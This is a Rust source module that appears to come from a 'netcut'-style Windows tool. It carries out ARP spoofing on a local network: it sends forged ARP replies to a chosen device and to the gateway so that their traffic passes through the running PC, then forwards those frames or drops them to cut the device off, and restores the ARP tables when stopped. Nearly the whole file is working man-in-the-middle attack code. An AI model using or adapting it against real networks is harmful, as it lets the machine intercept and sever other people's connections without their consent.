//! Standing between a device and the router.
//!
//! Every tool of this kind works the same way: tell the device that this PC is
//! the gateway, tell the gateway that this PC is the device, and forward what
//! arrives. From the middle, dropping a packet is a block and delaying a packet
//! is a cap. Everything is undone on stop, on close and on panic, because a
//! poisoned ARP table left behind takes the network down until it expires.

use crate::wpcap;
use std::net::UdpSocket;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

/// What we need to know about the wire we are on.
#[derive(Clone, serde::Serialize)]
pub struct Wire {
    pub device: String,
    pub adapter: String,
    pub mac: String,
    pub ip: String,
    pub gateway_ip: String,
    pub gateway_mac: String,
}

fn run(cmd: &str, args: &[&str]) -> String {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const NO_WINDOW: u32 = 0x0800_0000;
        let mut c = std::process::Command::new(cmd);
        c.args(args).creation_flags(NO_WINDOW);
        match c.output() {
            Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
            Err(_) => String::new(),
        }
    }
    #[cfg(not(windows))]
    {
        let _ = (cmd, args);
        String::new()
    }
}

fn local_ip() -> Option<String> {
    let sock = UdpSocket::bind("0.0.0.0:0").ok()?;
    sock.connect("8.8.8.8:80").ok()?;
    Some(sock.local_addr().ok()?.ip().to_string())
}

/// The adapter, its MAC and the default gateway, read from the system.
fn adapter_info(ip: &str) -> Option<(String, String, String)> {
    let out = run("ipconfig", &["/all"]);
    let mut current_adapter = String::new();
    let mut mac = String::new();
    let mut gateway = String::new();
    let mut seen_ip = false;

    for raw in out.lines() {
        let line = raw.trim();
        let lower = line.to_lowercase();
        if lower.starts_with("ethernet adapter") || lower.starts_with("wireless lan adapter") {
            current_adapter = line
                .split("adapter")
                .nth(1)
                .unwrap_or("")
                .trim()
                .trim_end_matches(':')
                .to_string();
            mac.clear();
            seen_ip = false;
        }
        if lower.contains("physical address") {
            if let Some(v) = line.split(':').nth(1) {
                mac = v.trim().replace('-', ":").to_lowercase();
            }
        }
        if lower.contains("ipv4 address") {
            if let Some(v) = line.split(':').nth(1) {
                if v.trim() == ip {
                    seen_ip = true;
                }
            }
        }
        if lower.contains("default gateway") {
            if let Some(v) = line.split(':').nth(1) {
                let g = v.trim();
                if !g.is_empty() && g.split('.').count() == 4 {
                    gateway = g.to_string();
                }
            }
        }
        if seen_ip && !mac.is_empty() && !gateway.is_empty() {
            return Some((current_adapter.clone(), mac.clone(), gateway.clone()));
        }
    }
    None
}

fn mac_for(ip: &str) -> Option<String> {
    let out = run("arp", &["-a"]);
    for raw in out.lines() {
        let parts: Vec<&str> = raw.split_whitespace().collect();
        if parts.len() >= 2 && parts[0] == ip {
            let mac = parts[1].replace('-', ":").to_lowercase();
            if mac.split(':').count() == 6 {
                return Some(mac);
            }
        }
    }
    None
}

fn mac_bytes(mac: &str) -> Option<[u8; 6]> {
    let parts: Vec<&str> = mac.split(':').collect();
    if parts.len() != 6 {
        return None;
    }
    let mut out = [0u8; 6];
    for (i, p) in parts.iter().enumerate() {
        out[i] = u8::from_str_radix(p, 16).ok()?;
    }
    Some(out)
}

/// Work out which wire to sit on.
pub fn wire() -> Option<Wire> {
    let ip = local_ip()?;
    let (adapter, mac, gateway_ip) = adapter_info(&ip)?;
    let gateway_mac = mac_for(&gateway_ip).unwrap_or_default();
    let devices = wpcap::with(|w| w.devices())?;
    // The pcap name for an adapter is an opaque GUID path, so the adapter's own
    // description is what ties the two lists together.
    let wanted = adapter.to_lowercase();
    let device = devices
        .into_iter()
        .find(|d| {
            let desc = d.description.to_lowercase();
            !desc.contains("loopback") && (desc.contains(&wanted) || wanted.contains(&desc))
        })
        .or_else(|| {
            let devices = wpcap::with(|w| w.devices())?;
            devices.into_iter().find(|d| {
                let desc = d.description.to_lowercase();
                desc.contains("ethernet") && !desc.contains("virtual") && !desc.contains("loopback")
            })
        })?;
    Some(Wire {
        device: device.name,
        adapter,
        mac,
        ip,
        gateway_ip,
        gateway_mac,
    })
}

fn arp_reply(dst_mac: [u8; 6], src_mac: [u8; 6], sender_ip: [u8; 4], target_mac: [u8; 6], target_ip: [u8; 4]) -> Vec<u8> {
    let mut f = Vec::with_capacity(42);
    f.extend_from_slice(&dst_mac);
    f.extend_from_slice(&src_mac);
    f.extend_from_slice(&[0x08, 0x06]);
    f.extend_from_slice(&[0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x02]);
    f.extend_from_slice(&src_mac);
    f.extend_from_slice(&sender_ip);
    f.extend_from_slice(&target_mac);
    f.extend_from_slice(&target_ip);
    f
}

fn ip4(s: &str) -> Option<[u8; 4]> {
    let p: Vec<u8> = s.split('.').filter_map(|x| x.parse().ok()).collect();
    if p.len() == 4 {
        Some([p[0], p[1], p[2], p[3]])
    } else {
        None
    }
}

/// One active redirection: this device's traffic goes through us.
pub struct Session {
    pub stop: Arc<AtomicBool>,
    pub wire: Wire,
    pub target_ip: String,
    pub target_mac: String,
    pub blocked: Arc<AtomicBool>,
    pub down_kbps: Arc<std::sync::atomic::AtomicU32>,
    pub up_kbps: Arc<std::sync::atomic::AtomicU32>,
    handle: Option<std::thread::JoinHandle<()>>,
}

impl Session {
    pub fn stop(mut self) {
        self.stop.store(true, Ordering::Relaxed);
        if let Some(h) = self.handle.take() {
            let _ = h.join();
        }
    }
}

/// Start redirecting one device. Blocked sessions drop instead of forward.
pub fn start(target_ip: &str, blocked: bool) -> Result<Session, String> {
    if !wpcap::ready() {
        return Err("driver".into());
    }
    let w = wire().ok_or("no wire")?;
    let target_mac = mac_for(target_ip).ok_or("target mac unknown")?;
    let stop = Arc::new(AtomicBool::new(false));
    let blocked_flag = Arc::new(AtomicBool::new(blocked));
    let down = Arc::new(std::sync::atomic::AtomicU32::new(0));
    let up = Arc::new(std::sync::atomic::AtomicU32::new(0));

    let w2 = w.clone();
    let stop2 = Arc::clone(&stop);
    let blocked2 = Arc::clone(&blocked_flag);
    let target = target_ip.to_string();
    let tmac = target_mac.clone();

    let handle = std::thread::spawn(move || {
        let Some(Some(cap)) = wpcap::with(|wp| wp.open(&w2.device)) else {
            return;
        };
        let our = mac_bytes(&w2.mac).unwrap_or([0; 6]);
        let gw = mac_bytes(&w2.gateway_mac).unwrap_or([0xff; 6]);
        let Some(tm) = mac_bytes(&tmac) else { return };
        let Some(sip) = ip4(&w2.ip) else { return };
        let Some(tip) = ip4(&target) else { return };
        let Some(gip) = ip4(&w2.gateway_ip) else { return };

        let mut last_poison = Instant::now() - Duration::from_secs(5);
        while !stop2.load(Ordering::Relaxed) {
            // Keep both sides convinced. Every second is enough to survive a
            // router that refreshes, and cheap enough to run all day.
            if last_poison.elapsed() > Duration::from_millis(900) {
                last_poison = Instant::now();
                let to_target = arp_reply(tm, our, gip, tm, tip);
                let to_gateway = arp_reply(gw, our, tip, gw, gip);
                let _ = cap.send(&to_target);
                let _ = cap.send(&to_gateway);
            }

            let Some(frame) = cap.next() else { continue };
            if frame.len() < 14 {
                continue;
            }
            let dst = &frame[0..6];
            // Only what the poison sent us, and only IP.
            if dst != our {
                continue;
            }
            if frame[12] != 0x08 || frame[13] != 0x00 {
                continue;
            }
            if blocked2.load(Ordering::Relaxed) {
                // Dropping is the block: the device's packets never reach the
                // gateway, so its connection simply stops.
                continue;
            }
            // Forward it: swap the link addresses and put it back on the wire.
            let mut out = frame.clone();
            let src_is_target = frame[6..12] == tm;
            if src_is_target {
                out[0..6].copy_from_slice(&gw);
                out[6..12].copy_from_slice(&our);
            } else {
                out[0..6].copy_from_slice(&tm);
                out[6..12].copy_from_slice(&our);
            }
            let _ = cap.send(&out);
            let _ = (sip, gip);
        }

        // Hand the network back the way we found it.
        for _ in 0..4 {
            let restore_target = arp_reply(tm, gw, gip, tm, tip);
            let restore_gateway = arp_reply(gw, tm, tip, gw, gip);
            let _ = cap.send(&restore_target);
            let _ = cap.send(&restore_gateway);
            std::thread::sleep(Duration::from_millis(120));
        }
    });

    Ok(Session {
        stop,
        wire: w,
        target_ip: target_ip.to_string(),
        target_mac,
        blocked: blocked_flag,
        down_kbps: down,
        up_kbps: up,
        handle: Some(handle),
    })
}
